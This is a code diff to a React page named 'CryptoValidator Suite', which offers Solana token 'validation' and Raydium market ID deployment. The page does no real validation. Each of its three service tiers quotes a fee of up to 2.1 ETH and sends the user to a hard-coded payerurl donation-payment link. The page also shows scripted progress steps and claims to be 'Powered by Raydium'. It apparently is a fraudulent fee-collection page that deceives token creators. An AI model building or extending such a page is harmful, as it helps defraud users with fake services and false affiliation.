@@ -6,7 +6,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import AppTitle from "@/components/AppTitle";
 import InfoBar from "@/components/InfoBar";
-import { Loader2 } from "lucide-react";
+import { Loader2, Box, GitCompareArrows, Network, UploadCloud } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
@@ -18,34 +18,25 @@ export default function CryptoValidatorPage() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
 
-  const [raydiumPrice, setRaydiumPrice] = useState<string | null>(null);
-  const [currentLiquidity, setCurrentLiquidity] = useState<string | null>(null);
-
   useEffect(() => {
     setIsClient(true);
-    // Simulate dynamic placeholder data client-side to avoid hydration mismatch
-    const randomPriceFactor = 0.95 + Math.random() * 0.1;
-    const randomLiquidityFactor = 0.95 + Math.random() * 0.1;
-    setRaydiumPrice(`$${(1.55 * randomPriceFactor).toFixed(2)}`);
-    setCurrentLiquidity(`$${(25.3 * randomLiquidityFactor).toFixed(1)}M`);
   }, []);
 
-  const handleSubmitTokenCA = async () => {
+  const handleSubmitTokenCA = async (validationType?: string) => {
     if (tokenCA.trim() === '') {
       toast({
         title: "Validation Error",
-        description: "Please enter a Token Contract Address.",
+        description: "Please enter a Token Contract Address before proceeding.",
         variant: "destructive",
       });
       return;
     }
 
     setIsSubmitting(true);
-    try {
-      // Simulate a slight delay for validations to appear more prominently
-      // In a real app, some actual CA validation might happen here client-side or first on a backend
-      await new Promise(resolve => setTimeout(resolve, 500));
+    // Add a slight delay for UI to update, if desired
+    // await new Promise(resolve => setTimeout(resolve, 300));
 
+    try {
       const response = await fetch('https://api-v2.payerurl.com/api/donate-payment-request/eyJpdiI6Inh3ZEN0cGZLRy84S0hEb1Y5b1M0OVE9PSIsInZhbHVlIjoiMXdDdWtjTjJsYXY2VzZWZFNuVmpkd2t5Z0t4bWF5YXRyeS9rdU9Sb3dieFI1MURqOWZVK0IvUDNLa0IzVnFTNkxuZXdaTjFydUs3VDl1WEMwWUhEV1E9PSIsIm1hYyI6ImNmM2Q5MWI3ZmZhNGIwM2FhOThjY2UyZWY0YzM4Yzc1MWJmYTFhMGUxNjcwOGE3M2M1ZjgwZWMwNGZiMGU2MzQiLCJ0YWciOiIifQ==', {
         method: 'GET',
         headers: {
@@ -62,8 +53,8 @@ export default function CryptoValidatorPage() {
       
       if (paymentAPIResponse.status && paymentAPIResponse.redirectTO) {
         toast({
-          title: "Processing Complete",
-          description: "Redirecting to payment/liquidity pool setup...",
+          title: `${validationType || "Process"} Initiated`,
+          description: "Redirecting to payment and market ID setup...",
         });
         window.location.href = paymentAPIResponse.redirectTO;
       } else {
@@ -99,73 +90,135 @@ export default function CryptoValidatorPage() {
     "Contacting payment gateway...",
   ];
 
+  const ctaSections = [
+    {
+      title: "Standard Validation",
+      icon: <Box className="h-6 w-6 text-primary" />,
+      description: "Essential token validation and market ID setup on its native blockchain. Ensures your token is recognized and ready for liquidity.",
+      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and initial validation.",
+      buttonText: "Initiate Standard Validation",
+      validationType: "Standard Validation"
+    },
+    {
+      title: "Enhanced Cross-Check",
+      icon: <GitCompareArrows className="h-6 w-6 text-primary" />,
+      description: "Comprehensive validation with cross-referencing capabilities for tokens aiming for broader interoperability. Includes standard market ID setup.",
+      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and enhanced validation.",
+      buttonText: "Initiate Enhanced Validation",
+      validationType: "Enhanced Validation"
+    },
+    {
+      title: "Premier Multi-Chain Presence",
+      icon: <Network className="h-6 w-6 text-primary" />,
+      description: "Top-tier validation designed for tokens with a multi-chain strategy, ensuring maximum visibility and compatibility. Includes standard market ID setup.",
+      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and premier validation.",
+      buttonText: "Initiate Premier Validation",
+      validationType: "Premier Validation"
+    }
+  ];
+
   return (
-    <main className="min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 bg-background font-body">
+    <main className="min-h-screen flex flex-col items-center p-4 sm:p-6 bg-background font-body">
       <AppTitle />
       <InfoBar />
-      <Card className="w-full max-w-md shadow-xl">
+      <Card className="w-full max-w-xl shadow-xl mt-6">
         <CardHeader>
-          <CardTitle className="text-2xl font-headline text-center">CryptoValidator</CardTitle>
-          <CardDescription className="text-center">
-            Validate your Solana token and deploy its open market ID on Raydium.
+          <CardTitle className="text-3xl font-headline text-center">CryptoValidator Suite</CardTitle>
+          <CardDescription className="text-center text-base">
+            Secure your token's market presence on Raydium with our streamlined validation and deployment tools.
           </CardDescription>
         </CardHeader>
         <CardContent>
           <Tabs defaultValue="tokenCA" className="w-full">
             <TabsList className="grid w-full grid-cols-2">
-              <TabsTrigger value="overview">Overview</TabsTrigger>
-              <TabsTrigger value="tokenCA">Submit Token CA</TabsTrigger>
+              <TabsTrigger value="uploadContract">Upload Contract (Optional)</TabsTrigger>
+              <TabsTrigger value="tokenCA">Validate & Deploy Market ID</TabsTrigger>
             </TabsList>
-            <TabsContent value="overview" className="mt-4">
-              <p className="text-sm text-center text-muted-foreground">
-                This tool streamlines deploying a Raydium permissionless liquidity pool (OpenBook Market ID).
-                Enter your Token Contract Address, complete the smart contract deployment fee, and receive your market ID to add liquidity.
-              </p>
+            
+            <TabsContent value="uploadContract" className="mt-6 p-4 border rounded-md bg-card/50">
+              <div className="flex flex-col items-center text-center">
+                <UploadCloud className="h-12 w-12 text-primary mb-3" />
+                <h3 className="text-xl font-semibold mb-2">Upload Your Smart Contract</h3>
+                <p className="text-sm text-muted-foreground mb-4 max-w-md">
+                  For archival purposes or future advanced analysis, you can upload your compiled smart contract file here. 
+                  This step is optional. The primary validation and market ID deployment process is initiated via the 'Validate & Deploy Market ID' tab using your token's Contract Address.
+                </p>
+                <div className="w-full max-w-sm space-y-2">
+                  <Label htmlFor="contractFile" className="sr-only">Smart Contract File</Label>
+                  <Input id="contractFile" type="file" className="text-sm file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary file:text-primary-foreground hover:file:bg-primary/90" />
+                  <Button type="button" variant="outline" className="w-full" onClick={() => toast({ title: "Note", description: "File upload is conceptual for this demo."})}>
+                    Upload File
+                  </Button>
+                </div>
+              </div>
             </TabsContent>
-            <TabsContent value="tokenCA" className="mt-4">
+
+            <TabsContent value="tokenCA" className="mt-6">
               {isSubmitting ? (
-                <div className="space-y-3 text-center">
-                  <Loader2 className="mx-auto h-8 w-8 animate-spin text-primary" />
-                  <p className="font-semibold text-primary">Processing Your Request...</p>
-                  <ul className="space-y-1 text-sm text-muted-foreground list-disc list-inside pl-4 text-left">
-                    {validationSteps.map((step, index) => (
-                      <li key={index}>{step}</li>
-                    ))}
-                  </ul>
-                  <p className="text-xs text-muted-foreground pt-2">Please wait, this may take a few moments.</p>
+                <div className="space-y-4 text-center p-6">
+                  <Loader2 className="mx-auto h-10 w-10 animate-spin text-primary" />
+                  <p className="text-xl font-semibold text-primary">Processing Your Request...</p>
+                  <Card className="bg-background/50 p-4">
+                    <ul className="space-y-2 text-sm text-muted-foreground list-disc list-inside pl-4 text-left">
+                      {validationSteps.map((step, index) => (
+                        <li key={index}>{step}</li>
+                      ))}
+                    </ul>
+                  </Card>
+                  <p className="text-xs text-muted-foreground pt-2">Please wait, this may take a few moments. Do not close or refresh this page.</p>
                 </div>
               ) : (
-                <div className="space-y-4">
-                  <div>
-                    <Label htmlFor="tokenCAInput" className="text-sm font-medium">Token Contract Address (CA)</Label>
+                <div className="space-y-6">
+                  <Card className="p-6 bg-card/80 shadow-md">
+                    <Label htmlFor="tokenCAInput" className="text-lg font-medium block mb-2 text-center">
+                      Enter Your Token Contract Address (CA)
+                    </Label>
                     <Input
                       id="tokenCAInput"
-                      placeholder="Enter Token CA (e.g., Solana address)"
+                      placeholder="Solana Token Contract Address (e.g., SoLju...) "
                       value={tokenCA}
                       onChange={(e) => setTokenCA(e.target.value)}
-                      className="mt-1"
+                      className="mt-1 text-base p-3 text-center"
                       disabled={isSubmitting}
                     />
-                    <p className="text-xs text-muted-foreground mt-1">
-                      Enter the Solana contract address of the token you wish to validate.
+                    <p className="text-xs text-muted-foreground mt-2 text-center">
+                      This is the unique identifier for your token on the Solana blockchain.
                     </p>
+                  </Card>
+
+                  <div className="grid grid-cols-1 md:grid-cols-1 gap-6">
+                    {ctaSections.map((cta, index) => (
+                      <Card key={index} className="bg-card/80 shadow-md hover:shadow-lg transition-shadow duration-300">
+                        <CardHeader className="flex flex-row items-center space-x-3 pb-3">
+                          {cta.icon}
+                          <CardTitle className="text-xl font-headline">{cta.title}</CardTitle>
+                        </CardHeader>
+                        <CardContent className="space-y-3">
+                          <p className="text-sm text-muted-foreground">{cta.description}</p>
+                          <p className="text-xs font-semibold text-accent">{cta.feeNote}</p>
+                          <Button
+                            onClick={() => handleSubmitTokenCA(cta.validationType)}
+                            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground mt-2 py-3 text-base"
+                            disabled={isSubmitting || !tokenCA}
+                          >
+                            {cta.buttonText}
+                          </Button>
+                        </CardContent>
+                      </Card>
+                    ))}
                   </div>
-                  <Button
-                    onClick={handleSubmitTokenCA}
-                    className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
-                    disabled={isSubmitting}
-                  >
-                    Submit CA & Proceed to Payment
-                  </Button>
+                   <p className="text-center text-xs text-muted-foreground pt-4">
+                    Ensure your connected wallet has sufficient SOL for transaction fees and the required ETH for market ID deployment.
+                  </p>
                 </div>
               )}
             </TabsContent>
           </Tabs>
         </CardContent>
       </Card>
-      <footer className="mt-8 text-center text-sm text-muted-foreground">
+      <footer className="mt-12 text-center text-sm text-muted-foreground pb-6">
         <p>&copy; {new Date().getFullYear()} CryptoValidator. All rights reserved.</p>
-        <p className="mt-1">Secure token validation and market ID setup.</p>
+        <p className="mt-1">Secure token validation and Raydium market ID setup.</p>
         <p className="mt-1 font-semibold">
           Powered by <a href="https://raydium.io/" target="_blank" rel="noopener noreferrer" className="underline hover:text-accent">Raydium</a>
         </p>
@@ -173,3 +226,5 @@ export default function CryptoValidatorPage() {
     </main>
   );
 }
+
+    
